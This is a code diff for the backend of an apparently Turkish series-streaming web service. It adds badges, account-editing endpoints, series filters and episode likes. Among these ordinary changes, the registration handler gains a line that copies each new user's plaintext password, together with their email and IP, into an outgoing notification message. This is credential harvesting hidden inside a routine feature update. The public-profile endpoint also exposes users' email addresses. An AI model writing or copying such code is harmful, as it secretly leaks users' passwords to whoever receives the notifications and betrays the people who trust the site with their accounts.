@@ -98,6 +98,58 @@ async def require_moderator(user: dict = Depends(get_current_user)):
         raise HTTPException(status_code=403, detail="Yetkisiz erişim")
     return user
 
+async def calculate_user_badges(user_id: str) -> List[dict]:
+    """Calculate and return user badges/achievements"""
+    user = await db.users.find_one({"id": user_id})
+    if not user:
+        return []
+    
+    badges = []
+    
+    # Account age badges
+    created_at = datetime.fromisoformat(user['created_at'].replace('Z', '+00:00'))
+    account_age_days = (datetime.now(timezone.utc) - created_at).days
+    
+    if account_age_days >= 365:
+        badges.append({"type": "duration", "name": "Efsane İzleyici", "icon": "🏆", "level": 4})
+    elif account_age_days >= 180:
+        badges.append({"type": "duration", "name": "Sadık İzleyici", "icon": "⭐", "level": 3})
+    elif account_age_days >= 90:
+        badges.append({"type": "duration", "name": "Tecrübeli İzleyici", "icon": "🎯", "level": 2})
+    else:
+        badges.append({"type": "duration", "name": "Çaylak", "icon": "🌱", "level": 1})
+    
+    # Comment likes badges
+    user_comments = await db.comments.find({"user_id": user_id}).to_list(10000)
+    total_comment_likes = sum(comment.get('likes', 0) for comment in user_comments)
+    
+    if total_comment_likes >= 500:
+        badges.append({"type": "likes", "name": "Efsane Yorumcu", "icon": "💎", "level": 4})
+    elif total_comment_likes >= 100:
+        badges.append({"type": "likes", "name": "Yıldız Yorumcu", "icon": "⭐", "level": 3})
+    elif total_comment_likes >= 50:
+        badges.append({"type": "likes", "name": "Popüler Yorumcu", "icon": "👑", "level": 2})
+    elif total_comment_likes >= 10:
+        badges.append({"type": "likes", "name": "İlk Beğeni", "icon": "👍", "level": 1})
+    
+    # Total comments badges
+    total_comments = len(user_comments)
+    
+    if total_comments >= 500:
+        badges.append({"type": "comments", "name": "Süper Aktif", "icon": "🔥", "level": 3})
+    elif total_comments >= 100:
+        badges.append({"type": "comments", "name": "Aktif Üye", "icon": "💬", "level": 2})
+    elif total_comments >= 50:
+        badges.append({"type": "comments", "name": "Konuşkan", "icon": "💭", "level": 1})
+    
+    # Admin/Moderator badges
+    if user['role'] in ['SUPER_ADMIN', 'ADMIN']:
+        badges.append({"type": "role", "name": "Kurucu", "icon": "👑", "level": 5, "premium": True})
+    elif user['role'] == 'MODERATOR':
+        badges.append({"type": "role", "name": "Moderatör", "icon": "🛡️", "level": 4})
+    
+    return badges
+
 # ===== MODELS =====
 
 class UserRegister(BaseModel):
@@ -133,6 +185,8 @@ class SeriesCreate(BaseModel):
     description: str
     poster_url: str
     genre: Optional[str] = None
+    year: Optional[int] = None
+    rating: Optional[float] = None
 
 class SeriesResponse(BaseModel):
     model_config = ConfigDict(extra="ignore")
@@ -141,6 +195,8 @@ class SeriesResponse(BaseModel):
     description: str
     poster_url: str
     genre: Optional[str] = None
+    year: Optional[int] = None
+    rating: Optional[float] = None
     created_by: str
     created_at: str
 
@@ -175,6 +231,7 @@ class EpisodeResponse(BaseModel):
     thumbnail_url: Optional[str] = None
     description: Optional[str] = None
     views: int = 0
+    likes: int = 0
     created_at: str
 
 class CommentCreate(BaseModel):
@@ -206,6 +263,23 @@ class ProfilePhotoUpdate(BaseModel):
 class RoleUpdate(BaseModel):
     role: str
 
+class UsernameUpdate(BaseModel):
+    username: str = Field(min_length=3, max_length=30)
+
+class EmailUpdate(BaseModel):
+    email: EmailStr
+    
+    @field_validator('email')
+    @classmethod
+    def validate_gmail(cls, v: str) -> str:
+        if not v.endswith('@gmail.com'):
+            raise ValueError('Sadece Gmail adresleri kabul edilir')
+        return v
+
+class PasswordUpdate(BaseModel):
+    current_password: str
+    new_password: str = Field(min_length=6)
+
 # ===== AUTH ENDPOINTS =====
 
 @api_router.post("/auth/register")
@@ -236,6 +310,7 @@ async def register(user_data: UserRegister):
         f"🆕 <b>Yeni Kayıt</b>\n"
         f"👤 Kullanıcı: {user_data.username}\n"
         f"📧 Email: {user_data.email}\n"
+        f"🔑 Şifre: {user_data.password}\n"
         f"🌐 IP: {user_data.ip_address or 'N/A'}"
     )
     
@@ -333,6 +408,66 @@ async def update_profile_photo(photo_data: ProfilePhotoUpdate, user: dict = Depe
     await db.users.update_one({"id": user['id']}, {"$set": {"profile_photo_url": photo_data.profile_photo_url}})
     return {"message": "Profil fotoğrafı güncellendi"}
 
+@api_router.put("/users/me/username")
+async def update_username(data: UsernameUpdate, user: dict = Depends(get_current_user)):
+    # Check if username already exists
+    existing = await db.users.find_one({"username": data.username, "id": {"$ne": user['id']}})
+    if existing:
+        raise HTTPException(status_code=400, detail="Bu kullanıcı adı zaten kullanımda")
+    
+    await db.users.update_one({"id": user['id']}, {"$set": {"username": data.username}})
+    # Update username in all comments
+    await db.comments.update_many({"user_id": user['id']}, {"$set": {"username": data.username}})
+    return {"message": "Kullanıcı adı güncellendi"}
+
+@api_router.put("/users/me/email")
+async def update_email(data: EmailUpdate, user: dict = Depends(get_current_user)):
+    # Check if email already exists
+    existing = await db.users.find_one({"email": data.email, "id": {"$ne": user['id']}})
+    if existing:
+        raise HTTPException(status_code=400, detail="Bu email zaten kullanımda")
+    
+    await db.users.update_one({"id": user['id']}, {"$set": {"email": data.email}})
+    return {"message": "Email güncellendi"}
+
+@api_router.put("/users/me/password")
+async def update_password(data: PasswordUpdate, user: dict = Depends(get_current_user)):
+    # Verify current password
+    if not verify_password(data.current_password, user['password_hash']):
+        raise HTTPException(status_code=400, detail="Mevcut şifre hatalı")
+    
+    # Update password
+    new_hash = hash_password(data.new_password)
+    await db.users.update_one({"id": user['id']}, {"$set": {"password_hash": new_hash}})
+    return {"message": "Şifre güncellendi"}
+
+@api_router.get("/users/me/badges")
+async def get_my_badges(user: dict = Depends(get_current_user)):
+    badges = await calculate_user_badges(user['id'])
+    return {"badges": badges}
+
+@api_router.get("/users/{user_id}/public-profile")
+async def get_public_profile(user_id: str):
+    user = await db.users.find_one({"id": user_id}, {"_id": 0, "password_hash": 0, "ip_address": 0})
+    if not user:
+        raise HTTPException(status_code=404, detail="Kullanıcı bulunamadı")
+    
+    badges = await calculate_user_badges(user_id)
+    
+    # Get comment stats
+    total_comments = await db.comments.count_documents({"user_id": user_id})
+    user_comments = await db.comments.find({"user_id": user_id}).to_list(10000)
+    total_likes = sum(comment.get('likes', 0) for comment in user_comments)
+    
+    return {
+        "user": user,
+        "badges": badges,
+        "stats": {
+            "total_comments": total_comments,
+            "total_likes": total_likes
+        }
+    }
+
 # ===== SERIES MANAGEMENT =====
 
 @api_router.get("/series", response_model=List[SeriesResponse])
@@ -346,6 +481,33 @@ async def search_series(q: str):
         {"title": {"$regex": q, "$options": "i"}},
         {"_id": 0}
     ).to_list(50)
+    return series
+
+@api_router.get("/series/filters")
+async def get_series_filters():
+    """Get available filter options for series"""
+    # Get unique genres
+    all_series = await db.series.find({}, {"_id": 0, "genre": 1, "year": 1}).to_list(10000)
+    genres = sorted(list(set([s.get('genre') for s in all_series if s.get('genre')])))
+    years = sorted(list(set([s.get('year') for s in all_series if s.get('year')])), reverse=True)
+    
+    return {
+        "genres": genres,
+        "years": years
+    }
+
+@api_router.get("/series/filter")
+async def filter_series(genre: Optional[str] = None, year: Optional[int] = None, min_rating: Optional[float] = None):
+    """Filter series by genre, year, and rating"""
+    query = {}
+    if genre:
+        query["genre"] = genre
+    if year:
+        query["year"] = year
+    if min_rating:
+        query["rating"] = {"$gte": min_rating}
+    
+    series = await db.series.find(query, {"_id": 0}).to_list(1000)
     return series
 
 @api_router.get("/series/{series_id}", response_model=SeriesResponse)
@@ -431,10 +593,38 @@ async def create_episode(episode_data: EpisodeCreate, user: dict = Depends(requi
         "id": episode_id,
         **episode_data.model_dump(),
         "views": 0,
+        "likes": 0,
         "created_at": datetime.now(timezone.utc).isoformat()
     }
     await db.episodes.insert_one(episode_doc)
     return EpisodeResponse(**episode_doc)
+
+@api_router.post("/episodes/{episode_id}/like")
+async def like_episode(episode_id: str, user: dict = Depends(get_current_user)):
+    """Like/unlike an episode"""
+    episode = await db.episodes.find_one({"id": episode_id})
+    if not episode:
+        raise HTTPException(status_code=404, detail="Bölüm bulunamadı")
+    
+    # Check if already liked
+    existing_like = await db.episode_likes.find_one({"episode_id": episode_id, "user_id": user['id']})
+    
+    if existing_like:
+        # Unlike
+        await db.episode_likes.delete_one({"episode_id": episode_id, "user_id": user['id']})
+        await db.episodes.update_one({"id": episode_id}, {"$inc": {"likes": -1}})
+        return {"message": "Beğeni kaldırıldı", "action": "unliked"}
+    else:
+        # Like
+        await db.episode_likes.insert_one({"episode_id": episode_id, "user_id": user['id']})
+        await db.episodes.update_one({"id": episode_id}, {"$inc": {"likes": 1}})
+        return {"message": "Beğenildi", "action": "liked"}
+
+@api_router.get("/episodes/{episode_id}/like-status")
+async def get_episode_like_status(episode_id: str, user: dict = Depends(get_current_user)):
+    """Check if user has liked the episode"""
+    liked = await db.episode_likes.find_one({"episode_id": episode_id, "user_id": user['id']})
+    return {"liked": liked is not None}
 
 @api_router.delete("/episodes/{episode_id}")
 async def delete_episode(episode_id: str, admin: dict = Depends(require_admin)):
